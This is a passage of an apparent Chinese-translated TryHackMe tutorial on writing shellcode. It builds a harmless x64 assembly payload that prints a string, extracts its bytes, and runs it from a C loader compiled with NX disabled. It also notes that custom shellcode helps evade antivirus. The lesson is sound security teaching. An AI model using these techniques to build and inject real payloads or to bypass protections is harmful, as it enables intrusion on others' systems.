19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="introduction-to-shellcode---shellcode-简介">Introduction to Shellcode - Shellcode 简介<a href="#introduction-to-shellcode---shellcode-简介" class="hash-link" aria-label="Direct link to Introduction to Shellcode - Shellcode 简介" title="Direct link to Introduction to Shellcode - Shellcode 简介">​</a></h2>
<p>Shellcode 是一组精心编写的机器码指令，指示易受攻击的程序运行额外的功能，并且在大多数情况下，提供系统 shell 的访问权限或创建一个反向命令 shell。</p>
<p>一旦 shellcode 被注入到进程中，并由易受攻击的软件或程序执行，它就会修改代码的运行流程，更新程序的寄存器和功能，从而执行攻击者的代码。</p>
<p>Shellcode 通常用汇编语言编写，并转换成十六进制操作码（opcode）。编写独特且定制的 shellcode 可以显著帮助绕过防病毒软件的检测。但编写自定义 shellcode 需要对汇编语言有极高的知识和技能，这绝非易事！</p>
<p>一个简单的 Shellcode！</p>
<p>为了制作你自己的 shellcode，需要具备以下技能：</p>
<ul>
<li>对 x86 和 x64 CPU 架构有较好的理解。</li>
<li>掌握汇编语言。</li>
<li>对 C 等编程语言有扎实的知识。</li>
<li>熟悉 Linux 和 Windows 操作系统。</li>
</ul>
<p>要生成我们自己的 shellcode，我们需要编写并从汇编机器码中提取字节。对于本任务，我们将使用 AttackBox 创建一个简单的 Linux shellcode，该 shellcode 用于输出字符串 &quot;THM, Rocks!&quot;。下面的汇编代码使用了两个主要函数：</p>
<ul>
<li>系统写入函数（sys_write），用于打印我们选择的字符串。</li>
<li>系统退出函数（sys_exit），用于终止程序执行。</li>
</ul>
<p>调用这些函数时，我们将使用 <strong>syscalls</strong>。syscall 是程序请求内核执行某些操作的方式。在本例中，我们将请求内核将字符串写入屏幕，然后退出程序。每个操作系统在调用 syscalls 时都有不同的调用约定，这意味着在 Linux 中使用 write 时，可能会使用与 Windows 不同的 syscall。对于 64 位 Linux，你可以通过设置以下寄存器的值来调用内核中的所需函数：</p>
<table><thead><tr><th><strong>rax</strong></th><th><strong>系统调用</strong></th><th><strong>rdi</strong></th><th><strong>rsi</strong></th><th><strong>rdx</strong></th></tr></thead><tbody><tr><td>0x1</td><td>sys_write</td><td>unsigned int fd</td><td>const char *buf</td><td>size_t count</td></tr><tr><td>0x3c</td><td>sys_exit</td><td>int error_code</td><td></td><td></td></tr></tbody></table>
<p>上表告诉我们，为了通过 syscalls 调用 sys_write 和 sys_exit 函数，需要在不同的处理器寄存器中设置哪些值。对于 64 位 Linux，rax 寄存器用于指示我们希望调用的内核函数。将 rax 设置为 0x1 会让内核执行 sys_write，而将 rax 设置为 0x3c 则会让内核执行 sys_exit。每个函数都需要一些参数，这些参数可以通过 rdi、rsi 和 rdx 寄存器设置。你可以在<a href="https://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/" target="_blank" rel="noopener noreferrer">这里</a>找到完整的 64 位 Linux syscalls 参考。</p>
<p>对于 <code>sys_write</code>，通过 <code>rdi</code> 传递的第一个参数是要写入的文件描述符。<code>rsi</code> 中的第二个参数是指向我们要打印的字符串的指针，而 <code>rdx</code> 中的第三个参数是要打印字符串的大小。</p>
<p>对于 <code>sys_exit</code>，rdi 需要设置为程序的退出码。我们将使用退出码 0，表示程序成功退出。</p>
<p>请将以下代码复制到你的 AttackBox 中，保存为文件 <code>thm.asm</code>：</p>
<div class="language-asm codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-asm codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">global _start</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">section .text</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">_start:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    jmp MESSAGE      ; 1) let&#x27;s jump to MESSAGE</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">GOBACK:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    mov rax, 0x1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    mov rdi, 0x1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    pop rsi          ; 3) we are popping into `rsi`; now we have the</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                     ; address of &quot;THM, Rocks!\r\n&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    mov rdx, 0xd</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    syscall</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    mov rax, 0x3c</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    mov rdi, 0x0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    syscall</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">MESSAGE:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    call GOBACK       ; 2) we are going back, since we used `call`, that means</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                      ; the return address, which is, in this case, the address</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                      ; of &quot;THM, Rocks!\r\n&quot;, is pushed into the stack.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    db &quot;THM, Rocks!&quot;, 0dh, 0ah</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>让我们进一步解释一下 ASM 代码。首先，我们的消息字符串存储在 .text 段的末尾。由于我们需要一个指针指向这个消息以便打印，我们会跳转到调用指令的位置，而这个位置在消息本身之前。当执行 <code>call GOBACK</code> 时，紧接着 <code>call</code> 指令后的下一条指令的地址会被推入栈中，这个地址对应着我们的消息位置。注意，消息结尾处的 0dh 和 0ah 是换行符 (\r\n) 的二进制等效。</p>
<p>接下来，程序开始执行 GOBACK 例程，并为我们第一个 sys_write() 函数准备所需的寄存器。</p>
<ul>
<li>我们通过将 1 存储到 rax 寄存器来指定 sys_write 函数。</li>
<li>我们将 rdi 设置为 1，以便将字符串输出到用户的控制台（STDOUT）。</li>
<li>我们从栈中弹出指向字符串的指针（在调用 GOBACK 时已经被推入栈中），并将其存储到 rsi 寄存器中。</li>
<li>通过 syscall 指令，我们使用准备好的值执行 sys_write 函数。</li>
<li>对于下一部分，我们做相同的操作来调用 sys_exit 函数，因此我们将 0x3c 存储到 rax 寄存器，并调用 syscall 函数退出程序。</li>
</ul>
<p>接下来，我们编译并链接 ASM 代码，创建一个 x64 Linux 可执行文件，最后执行程序。</p>
<div class="language-cmd codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-cmd codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">user@AttackBox$ nasm -f elf64 thm.asm</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">user@AttackBox$ ld thm.o -o thm</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">user@AttackBox$ ./thm</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">THM,Rocks!</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>我们使用 <code>nasm</code> 命令来编译 ASM 文件，指定 <code>-f elf64</code> 选项表示我们是在为 64 位 Linux 编译。需要注意的是，编译后会生成一个 <code>.o</code> 文件，它包含了目标代码，需要链接才能成为可执行文件。<code>ld</code> 命令用于链接目标文件，生成最终的可执行文件。<code>-o</code> 选项用于指定输出的可执行文件名称。</p>
<p>现在，我们已经获得了编译好的 ASM 程序，接下来使用 <code>objdump</code> 命令提取 shellcode，通过转储编译后的二进制文件的 <code>.text</code> 段。</p>
<div class="language-asm codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-asm codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">user@AttackBox$ objdump -d thm</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">thm:     file format elf64-x86-64</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Disassembly of section .text:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0000000000400080 &lt;_start&gt;:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  400080:	eb 1e                	jmp    4000a0 </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0000000000400082 :</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  400082:	b8 01 00 00 00       	mov    $0x1,%eax</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  400087:	bf 01 00 00 00       	mov    $0x1,%edi</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  40008c:	5e                   	pop    %rsi</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  40008d:	ba 0d 00 00 00       	mov    $0xd,%edx</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  400092:	0f 05                	syscall </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  400094:	b8 3c 00 00 00       	mov    $0x3c,%eax</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  400099:	bf 00 00 00 00       	mov    $0x0,%edi</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  40009e:	0f 05                	syscall </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">00000000004000a0 :</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  4000a0:	e8 dd ff ff ff       	callq  400082 </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  4000a5:	54                   	push   %rsp</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  4000a6:	48                   	rex.W</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  4000a7:	4d 2c 20             	rex.WRB sub $0x20,%al</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  4000aa:	52                   	push   %rdx</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  4000ab:	6f                   	outsl  %ds:(%rsi),(%dx)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  4000ac:	63 6b 73             	movslq 0x73(%rbx),%ebp</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  4000af:	21                   	.byte 0x21</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  4000b0:	0d                   	.byte 0xd</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  4000b1:	0a                   	.byte 0xa</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>现在我们需要从上述输出中提取十六进制值。为此，我们可以使用 <code>objcopy</code> 将 <code>.text</code> 部分转储到一个名为 <code>thm.text</code> 的新文件中，格式为二进制，操作如下：</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">user@AttackBox$ objcopy -j .text -O binary thm thm.text</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><code>thm.text</code> 文件包含了我们以二进制格式存储的 shellcode，因此，为了能够使用它，我们需要先将其转换为十六进制。<code>xxd</code> 命令具有 <code>-i</code> 选项，可以直接将二进制文件输出为 C 字符串格式，如下所示：</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">user@AttackBox$ xxd -i thm.text</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">unsigned char new_text[] = {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  0xeb, 0x1e, 0xb8, 0x01, 0x00, 0x00, 0x00, 0xbf, 0x01, 0x00, 0x00, 0x00,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  0x5e, 0xba, 0x0d, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xb8, 0x3c, 0x00, 0x00,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  0x00, 0xbf, 0x00, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xe8, 0xdd, 0xff, 0xff,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  0xff, 0x54, 0x48, 0x4d, 0x2c, 0x20, 0x52, 0x6f, 0x63, 0x6b, 0x73, 0x21,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  0x0d, 0x0a</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">};</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">unsigned int new_text_len = 50;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>最后，我们得到了格式化的 shellcode，它来自我们的 ASM 汇编代码。真有趣！正如我们所见，生成 shellcode 需要付出专注和技能！</p>
<p>为了确认提取的 shellcode 是否按预期工作，我们可以执行我们的 shellcode 并将其注入到 C 程序中。</p>
<div class="language-cpp codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-cpp codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token macro property directive-hash" style="color:#36acaa">#</span><span class="token macro property directive keyword" style="color:#00009f">include</span><span class="token macro property" style="color:#36acaa"> </span><span class="token macro property string" style="color:#e3116c">&lt;stdio.h&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">int</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">main</span><span class="token punctuation" style="color:#393A34">(</span><span class="token keyword" style="color:#00009f">int</span><span class="token plain"> argc</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">char</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token operator" style="color:#393A34">*</span><span class="token plain">argv</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">unsigned</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">char</span><span class="token plain"> message</span><span class="token punctuation" style="color:#393A34">[</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token number" style="color:#36acaa">0xeb</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x1e</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0xb8</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x01</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x00</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x00</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x00</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0xbf</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x01</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x00</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x00</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x00</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token number" style="color:#36acaa">0x5e</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0xba</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x0d</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x00</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x00</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x00</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x0f</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x05</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0xb8</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x3c</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x00</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x00</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token number" style="color:#36acaa">0x00</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0xbf</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x00</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x00</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x00</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x00</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x0f</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x05</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0xe8</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0xdd</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0xff</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0xff</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token number" style="color:#36acaa">0xff</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x54</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x48</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x4d</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x2c</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x20</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x52</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x6f</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x63</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x6b</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x73</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x21</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token number" style="color:#36acaa">0x0d</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x0a</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token punctuation" style="color:#393A34">}</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token punctuation" style="color:#393A34">(</span><span class="token operator" style="color:#393A34">*</span><span class="token punctuation" style="color:#393A34">(</span><span class="token keyword" style="color:#00009f">void</span><span class="token punctuation" style="color:#393A34">(</span><span class="token operator" style="color:#393A34">*</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">message</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">return</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>然后，我们按如下方式编译并执行它：</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">user@AttackBox$ gcc -g -Wall -z execstack thm.c -o thmx</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">user@AttackBox$ ./thmx</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">THM,Rocks!</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>太好了！它正常工作。请注意，我们通过禁用 NX 保护来编译 C 程序，因为 NX 保护可能会阻止我们在数据段或栈中正确执行代码。</p>
<p>理解 shellcode 及其创建方式对于接下来的任务至关重要，尤其是在处理 shellcode 的加密和编码时。</p>
